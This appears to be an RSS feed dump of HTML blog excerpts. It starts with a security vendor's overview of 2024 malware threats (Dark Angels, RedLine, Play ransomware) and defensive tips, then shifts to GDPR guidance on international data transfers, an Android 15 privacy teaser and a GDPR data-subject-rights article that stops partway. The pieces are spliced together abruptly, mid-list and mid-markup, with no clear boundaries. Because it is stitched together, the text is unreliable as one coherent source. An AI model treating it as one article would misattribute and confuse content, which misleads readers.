&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31081718/dark-angels-graphic.jpg"&gt;&lt;img alt="Color illustration explaining impact of the Dark Angels ransomware attack." class="wp-image-33461" height="523" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31081718/dark-angels-graphic.jpg" width="1000" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;br /&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Dark Angels emerged as one of the most formidable ransomware threats in 2024, gaining notoriety for their highly targeted &amp;#8220;big game hunting&amp;#8221; approach and record-breaking ransom demands. The group, which has been active since 2022, made headlines in early 2024 when they reportedly received a staggering $75 million ransom payment from a Fortune 50 company. This payment&amp;nbsp;would be nearly double the previous record of $40 million paid by CNA Financial in 2021.The group&amp;#8217;s modus operandi involves targeting a small number of high-value organizations, often exfiltrating massive amounts of data (typically 10-100 terabytes for large businesses) before considering encryption. This strategy allows Dark Angels to maintain a low profile while maximizing their profits.&lt;/p&gt;



&lt;p&gt;In 2024, they continued to evolve their tactics, switching from a Babuk-ESXi-based ransomware to a variant of Ragnar Locker. Notable attacks attributed to Dark Angels in 2024 included a breach of a high-profile media company, where they stole proprietary information and engaged in lengthy negotiations before the ransom was paid. The group&amp;#8217;s data leak site, named &amp;#8220;Dunghill Leak,&amp;#8221; is used to pressure victims into paying, though the group often prefers to avoid public attention. Dark Angels&amp;#8217; success in 2024, particularly the record-breaking ransom payment, has raised concerns that their tactics may be emulated by other cybercriminal groups, potentially leading to an increase in highly targeted, high-value ransomware attacks across various sectors.&lt;/p&gt;



&lt;h2&gt;RedLine: The Credential Thief&lt;/h2&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31081827/redline-graphic.jpg"&gt;&lt;img alt="Color illustration explaining impact of the Redline ransomware attack." class="wp-image-33463" height="488" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31081827/redline-graphic.jpg" width="1000" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;&lt;/p&gt;



&lt;p&gt;Not all of our Nastiest Malware are ransomware groups and RedLine Stealer has become one of the most prominent threats in 2024, particularly due to its capability to steal credentials and sensitive data across a wide array of sectors.&amp;nbsp;Throughout 2024, RedLine demonstrated its effectiveness by stealing over 170 million passwords in just a six-month period, highlighting its massive impact. The malware&amp;#8217;s capabilities expanded to include stealing not only passwords but also credit card details, cryptocurrency wallets, and browser data. Its adaptability and frequent updates allowed it to evade many security measures, making it a persistent threat across various sectors.&lt;/p&gt;



&lt;p&gt;RedLine&amp;#8217;s distribution methods remained diverse, with phishing emails and malicious websites being the primary vectors. The malware&amp;#8217;s operators continued to refine their tactics, often disguising RedLine as legitimate software updates or enticing downloads. This approach allowed them to bypass traditional security measures and infect a large number of systems. The impact of RedLine extended beyond individual users to affect major corporations and critical infrastructure. Several high-profile breaches attributed to RedLine in 2024 resulted in significant financial losses and reputational damage for the affected organizations. &lt;/p&gt;



&lt;p class="has-electric-grass-gradient-background has-background"&gt;&lt;strong&gt;Breaking news!&lt;/strong&gt;&lt;br /&gt;In late October 2024 &amp;#8211; RedLine suffered a takedown from a coordinated international law enforcement operation dubbed &amp;#8220;&lt;a href="https://www.operation-magnus.com/" rel="noreferrer noopener" target="_blank"&gt;Operation Magnus.&lt;/a&gt;&amp;#8221; Led by the Dutch National Police and supported by agencies including the FBI, UK&amp;#8217;s National Crime Agency, the operation successfully disrupted RedLine&amp;#8217;s infrastructure and operations. The authorities gained full access to RedLine&amp;#8217;s servers, obtaining crucial data including usernames, passwords, IP addresses, and even the source code of the malware. This breakthrough allowed law enforcement to retrieve a database of thousands of RedLine clients, paving the way for further investigations and potential legal actions against cybercriminals who used the malware. The U.S. Department of Justice charged Maxim Rudometov, a Russian national, as the suspected developer and leader of the RedLine malware operation. If convicted, Rudometov faces up to &lt;a href="https://www.justice.gov/usao-wdtx/pr/us-joins-international-action-against-redline-and-meta-infostealers" rel="noreferrer noopener" target="_blank"&gt;35 years in prison&lt;/a&gt; on charges including access device fraud, conspiracy to commit computer intrusion, and money laundering.&lt;/p&gt;



&lt;p&gt;Only time will tell if this seizure of assets is enough to shutdown the operations of RedLine and prevent them from bouncing back like we’ve seen time and time again from other resilient groups on this list. &lt;/p&gt;



&lt;h2&gt;Play Ransomware: The Versatile Threat&lt;/h2&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31082412/play-ransomware-graphic.jpg"&gt;&lt;img alt="Color illustration explaining impact of the Play Ransomware attack." class="wp-image-33465" height="501" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31082412/play-ransomware-graphic.jpg" width="1000" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;br /&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Play ransomware&amp;nbsp;continued to be a significant threat in the cybersecurity landscape throughout 2024. The group, which first appeared in 2022, maintained its position as one of the most active ransomware operations, consistently ranking among the top threat actors.&amp;nbsp;In 2024 a&amp;nbsp;notable shift occurred when the group transitioned from its previous double-extortion tactics to specifically targeting ESXi environments. This change in focus allowed Play to exploit vulnerabilities in virtual machine infrastructures, increasing the impact of their attacks.&lt;/p&gt;



&lt;p&gt;A significant attack attributed to Play Ransomware targeted a major utility provider, resulting in widespread service disruptions and raising concerns about critical infrastructure vulnerabilities. The attack began with the exploitation of unpatched FortiOS vulnerabilities in the company&amp;#8217;s VPN infrastructure, allowing initial access to the network. From there, the attackers leveraged exposed RDP services to move laterally within the network, eventually gaining the access needed to deploy their ransomware payload.&lt;/p&gt;



&lt;p&gt;The group&amp;#8217;s use of intermittent encryption continued to be a defining characteristic, allowing them to evade many endpoint security solutions while still rendering files inaccessible to victims. Play&amp;#8217;s attacks were particularly damaging in the IT services sector, suggesting a strategic focus on organizations that could lead to supply chain impacts.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31082513/ghastly-graphic.jpg"&gt;&lt;img alt="Header that reads: Ghastly goings-on" class="wp-image-33467" height="257" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31082513/ghastly-graphic.jpg" width="898" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;AI-Driven Phishing and Social Engineering:&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;The use of AI and machine learning in crafting phishing emails has made these lures more convincing and harder to detect. Cybercriminals are leveraging AI to personalize attacks, increasing their success rates&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Targeting of Critical Infrastructure:&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;There has been a noticeable increase in attacks targeting critical infrastructure, including utilities and healthcare sectors, raising concerns about national security and public safety&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Fileless Malware:&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;Fileless attacks aren’t new, and neither is bypassing security protections but there has been an increase in harder to detect kill chains, more sophisticated attacks, more complex persistence, that are more effective at bypassing security than ever.&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;New Malware Language:&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;Malware written in Golang continues to trend in both scale and complexity &lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://blog-en.webroot.com/wp-content/uploads/2024/10/31082628/survival-graphic.jpg"&gt;&lt;img alt="Header that reads: Survival Tips" class="wp-image-33469" height="211" src="https://blog-en.webroot.com/wp-content/uploads/2024/10/31082628/survival-graphic.jpg" width="776" /&gt;&lt;/a&gt;&lt;/figure&gt;



&lt;p&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Businesses:&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;Lock down Remote Desktop Protocols (RDP) &amp;#8211; this infiltration tactic has been around for a while, but it’s still one of the top infection vectors!&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Enhance Employee Training: Go beyond basic awareness. Implement regular, interactive cybersecurity simulations and scenario-based training.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;PATCH OR DIE!&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Implement a Multi-layered security and defense in depth posture.&amp;nbsp;&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Adopt a Comprehensive Backup Strategy: Implement the 3-2-1 backup rule with immutable backups to protect against ransomware attacks.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Develop and Test Incident Response Plans: Create, regularly update, and practice cybersecurity incident response plans.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;Individual Users:&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;



&lt;ul&gt;
&lt;li&gt;Use Password Managers: Employ a reputable password manager to create and store strong, unique passwords for all accounts – consider passphrases.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Enable Multi-Factor Authentication (MFA): Activate MFA on all accounts that offer it, preferably using authenticator apps or hardware keys.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Keep Software Updated: Enable automatic updates for your operating system, applications, and security software.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Be Cautious with Smart Devices: Secure your IoT devices by changing default passwords and keeping firmware updated.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Practice Safe Social Media: Be cautious about the personal information you share on social media platforms.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Use Virtual Private Networks (VPNs): Employ a reliable VPN service, especially when using public Wi-Fi networks.&amp;nbsp;&lt;/li&gt;

&lt;p&gt;Consequently, you must put an appropriate mechanism or safeguard in place to &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;transfer personal data internationally&lt;/a&gt;, such as:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The IDTA (international data transfer agreement);&lt;/li&gt;



&lt;li&gt;SCCs (standard contractual clauses); or&lt;/li&gt;



&lt;li&gt;BCRs (binding corporate rules).&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Let’s take a closer look at these mechanisms, and when and how to use them.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#What-are-SCCs-and-the-IDTA"&gt;What are SCCs and the IDTA?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#When-and-how-do-I-use-SCCs-the-IDTA"&gt;When and how do I use SCCs/the IDTA?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#What-are-BCRs"&gt;What are BCRs?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#When-should-I-implement-BCRs"&gt;When should I implement BCRs?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#How-can-we-use-BCRs"&gt;How can we use BCRs?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="What-are-SCCs-and-the-IDTA"&gt;What are SCCs and the IDTA?&lt;/h2&gt;



&lt;p&gt;Article 46(2)(c) of the EU GDPR allows for “standard data protection clauses adopted by the [European] Commission”. These are your ‘SCCs’ or ‘standard contractual clauses’.&lt;/p&gt;



&lt;p&gt;Post-Brexit, the UK introduced its own version of these model contractual clauses: the ‘IDTA’ or ‘international data transfer agreement’, but the same principles apply to both.&lt;/p&gt;



&lt;p&gt;Organisations can use these model contractual clauses to comply with their Article 28 requirements around &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-28-contracts-what-you-need-to-know" rel="noreferrer noopener" target="_blank"&gt;processor contracts&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;But they’re also a safeguard for international transfers if used correctly. Here are some points to consider:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Select the correct model clauses – the clauses are different for data controllers vs processors, and differ depending on the countries you’re sending data to.&lt;/li&gt;



&lt;li&gt;You can’t amend or remove the mandatory clauses of the IDTA/SCCs, but can amend their commercial terms, provided that they don’t change the meaning of the pre-written clauses. If you want to modify other aspects of the agreement, you’ll need to create a new contract.&lt;/li&gt;



&lt;li&gt;The clauses only apply to the data processing activities set out in the SCCs/IDTA. So, you must draft new contracts every time the activities change.&lt;/li&gt;



&lt;li&gt;You must complete a risk assessment, which will tell you whether you can proceed with the international data transfer. These are called:&lt;ul&gt;&lt;li&gt;IDTA: the TRA (transfer risk assessment).&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;SCCs: the TIA (transfer impact assessment).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Bear in mind that both the IDTA and SCCs are legal contracts. As such, we urge organisations to &lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-contract-and-legal-services" rel="noreferrer noopener" target="_blank"&gt;consult a data protection lawyer&lt;/a&gt; when creating them – because oversights in their terms or clauses could cause major problems.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="When-and-how-do-I-use-SCCs-the-IDTA"&gt;When and how do I use SCCs/the IDTA?&lt;/h2&gt;



&lt;p&gt;SCCs and the IDTA work well:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;For organisations likely to participate in two-way data sharing; and&lt;/li&gt;



&lt;li&gt;In internal personal data transfers where the processing is straightforward.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;However, in most cases, if the country you want to send personal data to has an adequacy decision, it makes more sense to rely on that.&lt;/p&gt;



&lt;p&gt;You also wouldn’t use SCCs or the IDTA if you’re an international organisation with an ongoing and/or complicated set of internal personal data transfers to undertake. This could quickly tie you up with &lt;em&gt;hundreds&lt;/em&gt; of SCCs to cover each pairing of entities, and each of your processing activities.&lt;/p&gt;



&lt;p&gt;In such a scenario, BCRs are usually more suitable.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="What-are-BCRs"&gt;What are BCRs?&lt;/h2&gt;



&lt;p&gt;BCRs are a set of internal rules (a bit like a code of conduct) that regulate international personal data transfers within a single multinational.&lt;/p&gt;



&lt;p&gt;They also act as a public acknowledgement of the privacy rights of individuals whose data is being processed. This can improve the organisation’s reputation among potential data subjects and other stakeholders.&lt;/p&gt;



&lt;p&gt;BCRs can be cumbersome to implement, because they cover a much larger and more complex set of processing activities than SCCs. That said, you just need &lt;em&gt;one&lt;/em&gt; set of rules, so long as:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;These are properly integrated into all data privacy laws you may need to comply with, including the UK and EU GDPR; and&lt;/li&gt;



&lt;li&gt;You have the correct supporting documents to go with them, like:&lt;ul&gt;&lt;li&gt;A list of covered entities;&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Data privacy policies and procedures;&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Data protection audit plans; and&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Guidelines for employees.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;








&lt;p&gt;This can make BCRs particularly suitable for large organisations that operate in many different countries or territories.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="When-should-I-implement-BCRs"&gt;When should I implement BCRs?&lt;/h2&gt;



&lt;p&gt;BCRs can apply to both controller and processor agreements/processing activities (of that single organisation).&lt;/p&gt;



&lt;p&gt;And once implemented and approved by the supervisory authority (which we’ll get to &lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#How-can-we-use-BCRs"&gt;below&lt;/a&gt;), BCRs have advantages like:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Making data protection an integral part of your organisation’s processes;&lt;/li&gt;



&lt;li&gt;Reducing compliance costs when you make changes to your processing activities; and&lt;/li&gt;



&lt;li&gt;Providing flexibility when you introduce new products or services (which usually changes your processing activities).&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="How-can-we-use-BCRs"&gt;How can we use BCRs?&lt;/h2&gt;



&lt;p&gt;The UK ICO (Information Commissioner’s Office) and European Commission regulate the use of the UK and EU BCRs respectively.&lt;/p&gt;



&lt;p&gt;Organisations that want to use EU BCRs must apply to a relevant supervisory authority to have their rules approved. The organisation must also designate a lead authority, who:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Advises other affected authorities, such as those in all EU member states where the organisation has offices; and&lt;/li&gt;



&lt;li&gt;Facilitates the authorisation process with other applicable data protection authorities.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;To use the UK BCRs, organisations must apply to the ICO. The regulator’s &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/guide-to-binding-corporate-rules/a-uk-bcr-addendum/" rel="noreferrer noopener" target="_blank"&gt;website&lt;/a&gt; has more information on the application process.&lt;/p&gt;



&lt;p&gt;BCRs can take 12 months or more to complete and, without legal assistance, can become onerous and extremely time-consuming.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;p&gt;Our sister company GRCI Law offers&amp;nbsp;&lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-contract-and-legal-services" rel="noreferrer noopener" target="_blank"&gt;GDPR Contract and Legal Services&lt;/a&gt;, including reviewing, drafting and/or updating your SCCs/IDTA and BCRs.&lt;/p&gt;



&lt;p&gt;We can advise whether SCCs/the IDTA or BCRs are most appropriate, and help you implement them to bring your data transfers in line with the GDPR and other data protection laws.&lt;/p&gt;



&lt;p&gt;We can also help you negotiate the complexities of international data transfers and ensure you have the right safeguards in place, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;TRAs and TIAs for the IDTA/SCCs; and&lt;/li&gt;



&lt;li&gt;Managing BCR registrations with supervisory authorities.&lt;/li&gt;
&lt;/ul&gt;

There is always a bunch of little changes to discover in an Android release, whether by reading, poking around, or letting your phone show you 25 new things after it restarts.&lt;/p&gt;
&lt;p&gt;In Android 15, some of the most notable involve making your device less appealing to snoops and thieves and more secure against the kids to whom you hand your phone to keep them quiet at dinner. There are also smart fixes for screen sharing, OTP codes, and cellular hacking prevention, but details about them are spread across Google's own docs and blogs and various news site's reports.&lt;/p&gt;
&lt;p&gt;Here's what is notable and new in how Android 15 handles privacy and security.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2024/10/android-15s-security-and-privacy-features-are-the-updates-highlight/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Organisations must let individuals know how they can exercise these rights, and meet requests promptly. Failure to do so is a violation of the GDPR and could lead to disciplinary action. But first, what is a data subject?&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/what-are-the-data-subject-rights-under-the-gdpr"&gt;GDPR: Data Subject Rights and Organisations’ Responsibilities&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance UK Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Both the&amp;nbsp;UK and EU &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt;&amp;nbsp;grant data subjects certain rights over their data, which, if exercised, data controllers must facilitate.&lt;/p&gt;



&lt;p&gt;Along with the data protection principles, the data subject rights – outlined in Articles 12–22 – are fundamental to the Regulation.&lt;/p&gt;



&lt;p&gt;Individuals suffer when their &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-how-the-definition-of-personal-data-will-change" rel="noreferrer noopener" target="_blank"&gt;personal data&lt;/a&gt; is lost, stolen or abused, so those who process it must look after it properly. Furthermore, organisations don’t own that data – it continues to belong to the individual, which the eight data subject rights reflect.&lt;/p&gt;



&lt;p&gt;Let’s go through them all.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-be-informed"&gt;The right to be informed&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-of-access"&gt;The right of access&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-rectification"&gt;The right to rectification&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-erasure"&gt;The right to erasure&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-restrict-processing"&gt;The right to restrict processing&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-data-portability"&gt;The right to data portability&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-object"&gt;The right to object&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Rights-related-to-automated-decision-making-including-profiling"&gt;Rights related to automated decision-making, including profiling&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-be-informed"&gt;1. The right to be informed (Article 13 and Article 14)&lt;/h2&gt;



&lt;p&gt;You need to tell individuals:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;What personal data you’re collecting from them;&lt;/li&gt;



&lt;li&gt;How you’re using it (or will be using it);&lt;/li&gt;



&lt;li&gt;How long you’re keeping it for; and&lt;/li&gt;



&lt;li&gt;Various other information.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Most data controllers choose to communicate this information via a &lt;a href="https://www.itgovernance.co.uk/blog/how-to-write-a-gdpr-privacy-notice-with-documentation-template-example" rel="noreferrer noopener" target="_blank"&gt;privacy notice&lt;/a&gt; (but this isn’t your only way to facilitate this right).&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-of-access"&gt;2. The right of access (Article 15)&lt;/h2&gt;



&lt;p&gt;Data subjects may request a copy of the personal data you’re processing (on that data subject), as well as information you must also share under Articles 13 and 14 (the right to be informed).&lt;/p&gt;



&lt;p&gt;This includes:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The purpose(s) of processing;&lt;/li&gt;



&lt;li&gt;The categories of personal data;&lt;/li&gt;



&lt;li&gt;The recipients of the personal data;&lt;/li&gt;



&lt;li&gt;Whether &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-automated-decision-making-and-profiling-what-are-the-requirements" rel="noreferrer noopener" target="_blank"&gt;automated decision-making&lt;/a&gt; is taking place, its significance, and envisaged consequences for the data subject; and&lt;/li&gt;



&lt;li&gt;Whether you’re transferring the data &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;internationally&lt;/a&gt;, and if so, what safeguards are in place.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;You must also inform data subjects of their other GDPR rights. That includes the right to lodge a complaint with the supervisory authority. In the UK, that’s the ICO (Information Commissioner’s Office).&lt;/p&gt;



&lt;p&gt;When a data subject exercises their right of access, we usually refer to this as a &lt;a href="https://www.itgovernance.co.uk/blog/how-to-respond-to-a-data-subject-access-request" rel="noreferrer noopener" target="_blank"&gt;DSAR (data subject access request)&lt;/a&gt;. But they’re not obliged to use that (or any other) specific phrase for their request to be valid.&lt;/p&gt;



&lt;p&gt;When someone exercises this right, you must respond within one month.&lt;/p&gt;

&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-rectification"&gt;3. The right to rectification (Article 16)&lt;/h2&gt;



&lt;p&gt;One of the key GDPR principles (Article 5(1)(d)) is ‘accuracy’.&lt;/p&gt;



&lt;p&gt;Related to that principle is the ‘right to rectification’. If exercised – meaning that a data subject alerts you to incorrect personal data on them – you (the &lt;a href="https://www.itgovernance.co.uk/blog/data-controller-vs-data-processor-whats-the-difference" rel="noreferrer noopener" target="_blank"&gt;data controller&lt;/a&gt;) must correct it.&lt;/p&gt;



&lt;p&gt;The right to rectification also means that if a data subject points out that, within the purposes of data processing, the data on them is incomplete, you must complete it.&lt;/p&gt;



&lt;p&gt;When someone exercises this right, you have one month to, if applicable, make the corrections and respond to the data subject.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-erasure"&gt;4. The right to erasure (Article 17)&lt;/h2&gt;



&lt;p&gt;The &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-17-what-is-the-right-to-erasure" rel="noreferrer noopener" target="_blank"&gt;right to erasure&lt;/a&gt; is also known as the ‘right to be forgotten’. It obliges you to erase someone’s data if they ask you to, where any of the following applies:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The processing was unlawful to begin with.&lt;/li&gt;



&lt;li&gt;The data subject has withdrawn their consent.&lt;/li&gt;



&lt;li&gt;You need to destroy the data to comply with a legal obligation.&lt;/li&gt;



&lt;li&gt;You no longer need the personal data for the purpose(s) for which you collected it.&lt;/li&gt;



&lt;li&gt;You were collecting the data to offer information society services directly to a child.&lt;/li&gt;



&lt;li&gt;The data subject can legitimately object to the processing (see ‘the right to object’ below).&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This right isn’t absolute, and you don’t need to delete the data if you still need the data to comply with a legal obligation, for example, or need it for reasons of public interest or archiving purposes.&lt;/p&gt;



&lt;p&gt;If you receive a request to be forgotten, you must respond within one month – either having actioned the request, or to explain why you need to keep (some of) their data.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-restrict-processing"&gt;5. The right to restrict processing (Article 18)&lt;/h2&gt;



&lt;p&gt;If a data subject exercises this right, you may store their data but not process it. (The restriction normally only applies for a limited time.)&lt;/p&gt;



&lt;p&gt;Someone may exercise this right because:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;They’re contesting the accuracy of the personal data;&lt;/li&gt;



&lt;li&gt;The processing is unlawful, but the subject doesn’t want their data destroyed;&lt;/li&gt;



&lt;li&gt;They’re challenging whether your legitimate grounds for processing override their interests; or&lt;/li&gt;



&lt;li&gt;You don’t need the personal data anymore, but the subject needs it to establish, exercise or defend a legal claim.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Again, if exercised, you must respond within one month.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-data-portability"&gt;6. The right to data portability (Article 20)&lt;/h2&gt;



&lt;p&gt;This right allows people to obtain their data from you in a “structured, commonly used and machine-readable format”, so they can easily reuse their data for other purposes.&lt;/p&gt;



&lt;p&gt;Someone will typically exercise this right when they’re changing providers – for their mobile phone contract, for example. That said, this right may be exercised in any circumstances where the data subject wants to have their personal data transferred to a different controller.&lt;/p&gt;



&lt;p&gt;Data subjects can only exercise this right if:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;They provided their data under the &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; of consent; &lt;em&gt;and&lt;/em&gt;&lt;/li&gt;



